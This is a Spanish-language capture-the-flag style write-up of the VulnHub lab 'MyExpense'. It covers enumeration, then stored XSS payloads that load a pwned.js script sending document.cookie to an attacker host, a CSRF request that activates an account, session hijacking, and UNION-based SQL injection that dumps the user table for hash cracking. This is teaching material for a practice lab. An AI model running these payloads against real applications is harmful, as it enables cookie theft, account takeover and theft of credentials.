---
tags:
  - Cybersecurity
  - Labs
  - VulnHub
  - HTTP
  - XSS
  - Stored
  - CSRF
  - SQLI
  - HashCracking
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Cross-Site Scripting (XSS) - Stored|Cross-Site Scripting (XSS) - Stored]]
	- [[#Explotación#Cross-Site Request Forgery (CSRF)|Cross-Site Request Forgery (CSRF)]]
	- [[#Explotación#Cross-Site Scripting (XSS) - Stored|Cross-Site Scripting (XSS) - Stored]]
	- [[#Explotación#SQL Injection (SQLi)|SQL Injection (SQLi)]]
	- [[#Explotación#Hash Cracking|Hash Cracking]]

---
# MyExpense

![](Screenshots/Pasted%20image%2020260102131650.png)

> En este write-up se documenta la resolución paso a paso de la máquina **MyExpense** de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/). El laboratorio se centra en vulnerabilidades web clásicas como **XSS almacenado**, **CSRF** y **SQL Injection**, permitiendo escalar progresivamente dentro de la aplicación.

---
## Enumeración

`ping -c 1 192.168.1.47`

![](Screenshots/Pasted%20image%2020260102094910.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.47 -oG allPorts`

![](Screenshots/Pasted%20image%2020260102094939.png)

`nmap -p80,34907,35771,44069,52203 -sCV 192.168.1.47 -oN targeted`

![](Screenshots/Pasted%20image%2020260102095025.png)
### HTTP

`http://192.168.1.47/`

![](Screenshots/Pasted%20image%2020260102095254.png)

Se observa un inicio de sesión, se accede con las credenciales que nos dan.

`http://192.168.1.47/login.php`

![](Screenshots/Pasted%20image%2020260102095746.png)

Nos da error.
### Fuzzing Web

`gobuster dir -u http://192.168.1.47/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020260102100208.png)

Se observan dos directorios interesantes:
- `robots.txt`
- `admin`

`http://192.168.1.47/robots.txt`

![](Screenshots/Pasted%20image%2020260102100353.png)

`http://192.168.1.47/admin/`

![](Screenshots/Pasted%20image%2020260102100434.png)

No tengo los permisos necesarios para acceder.

`http://192.168.1.47/admin/admin.php`

![](Screenshots/Pasted%20image%2020260102100519.png)

Se trata de un panel con todos los usuarios del sistema, vemos que nuestra cuenta (en teoría somos `Samuel Lamotte`) esta desactivada.

Se prueba a crear una nueva cuenta.

`http://192.168.1.47/signup.php`

![](Screenshots/Pasted%20image%2020260102100912.png)

No nos deja realizar "click" en crear la cuenta, pero esto se puede modificar al ser *HTTP*.

Se accede al código (`Ctrl + Shift + C`).

![](Screenshots/Pasted%20image%2020260102101218.png)

El atributo `disabled`, no permite interactuar con él. Se elimina el atributo para poder interactuar.

Se crea correctamente la cuenta, pero no podemos acceder.

![](Screenshots/Pasted%20image%2020260102101832.png)

---
## Explotación
### Cross-Site Scripting (XSS) - Stored

Se crea un nuevo usuario, pero probando si es vulnerable a **XSS Stored**, en los campos `Firstname` y `Lastname`.

![](Screenshots/Pasted%20image%2020260102102223.png)

Se recarga la página de usuarios y se produce correctamente el **XSS**.

Es posible, que el panel de usuarios, lo este revisando otra persona, se podría robar la *cookie de sesión*.

Se realiza un prueba para ver si alguien, lo revisa.

`<script src="http://[IP_ATACANTE]/index.php"></script>`

`nc -nlvp 80`

![](Screenshots/Pasted%20image%2020260102103215.png)

Se recibe una conexión.

Se crea un archivo llamado `pwned.js`.

```JS
var request = new XMLHttpRequest();
request.open('GET', 'http://[IP_ATACANTE]/?cookie=' + document.cookie);
request.send();
```

`<script src="http://[IP_ATACANTE]/pwned.js"></script>`

`python -m http.server 80`

![](Screenshots/Pasted%20image%2020260102104520.png)

Se  cambia la *cookie de sesión* y no nos sirve de nada.
### Cross-Site Request Forgery (CSRF)

Se observa en el panel de usuarios, que se puede activar las cuentas, queremos activar nuestra cuenta (`Samuel Lamotte`).

![](Screenshots/Pasted%20image%2020260102104916.png)

No tenemos permisos para activarlo, pero podemos hacer que nos lo active la persona que está revisando el panel. La *URL* es `http://192.168.1.47/admin/admin.php?id=11&status=active`, en vez de robarle la *Cookie de sesión*, le pasamos la *URL*.

Se modifica el archivo `pwned.js`.

```JS
var request = new XMLHttpRequest();
request.open('GET', 'http://[IP_VICTIMA]/admin/admin.php?id=11&status=active');
request.send();
```

`<script src="http://[IP_ATACANTE]/pwned.js"></script>`

`python -m http.server 80`

![](Screenshots/Pasted%20image%2020260102111738.png)

![](Screenshots/Pasted%20image%2020260102113642.png)

En este momento tuve que reiniciar la máquina, no me respondía correctamente, por si veis que la IP de la máquina victima ha cambiado.

Ahora, que ya tenemos la cuenta activada, se inicia sesión con el usuario `slamotte` y la contraseña que nos da el laboratorio.

![](Screenshots/Pasted%20image%2020260102120220.png)

![](Screenshots/Pasted%20image%2020260102120245.png)

El manager de `slamotte` es `Manon Riviere`.

![](Screenshots/Pasted%20image%2020260102120427.png)

Se aprueba el reporte y ahora nos lo tiene que aprovechar nuestro manager.

Se observa que podemos enviar un mensaje, donde se encuentra nuestro manager.
### Cross-Site Scripting (XSS) - Stored

Se modifica el archivo llamado `pwned.js`.

```JS
var request = new XMLHttpRequest();
request.open('GET', 'http://[IP_ATACANTE]:1234/?cookie=' + document.cookie);
request.send();
```

`<script src="http://[IP_ATACANTE]/pwned.js"></script>`

`python -m http.server 1234`

![](Screenshots/Pasted%20image%2020260102122527.png)

Se obtienen varias *cookies de sesión*, se va probando hasta encontrar la del usuario `Manon Riviere`.

![](Screenshots/Pasted%20image%2020260102123305.png)

Se aprueba el reporte.

![](Screenshots/Pasted%20image%2020260102123417.png)

El manager de `mriviere` es `Paul Baudouin`.
### SQL Injection (SQLi)

![](Screenshots/Pasted%20image%2020260102123517.png)

Se observa una BBDD. La *URL*: `http://192.168.1.199/site.php?id=2`.

`http://192.168.1.199/site.php?id=2'`: Nos da error.

`http://192.168.1.199/site.php?id=2-- -`: Se visualiza correctamente.

`http://192.168.1.199/site.php?id=2 ORDER BY 4-- -`: Se visualiza correctamente.

`http://192.168.1.199/site.php?id=2 UNION SELECT 1,2,3,4-- -`

![](Screenshots/Pasted%20image%2020260102124138.png)

`http://192.168.1.199/site.php?id=2 UNION SELECT null,schema_name,null,null FROM information_schema.schemata-- -`:

![](Screenshots/Pasted%20image%2020260102124357.png)

`http://192.168.1.199/site.php?id=2 UNION SELECT null,table_name,null,null FROM information_schema.tables WHERE table_schema='myexpense'-- -`:

![](Screenshots/Pasted%20image%2020260102124538.png)

`http://192.168.1.199/site.php?id=2 UNION SELECT null,column_name,null,null FROM information_schema.columns WHERE table_schema='myexpense' AND table_name='user'-- -`

![](Screenshots/Pasted%20image%2020260102124741.png)

`http://192.168.1.199/site.php?id=2 UNION SELECT user_id,lastname,username,password FROM myexpense.user-- -`

![](Screenshots/Pasted%20image%2020260102125649.png)
### Hash Cracking

[dCode](https://www.dcode.fr/cipher-identifier).

![](Screenshots/Pasted%20image%2020260102130414.png)

![](Screenshots/Pasted%20image%2020260102130532.png)

---


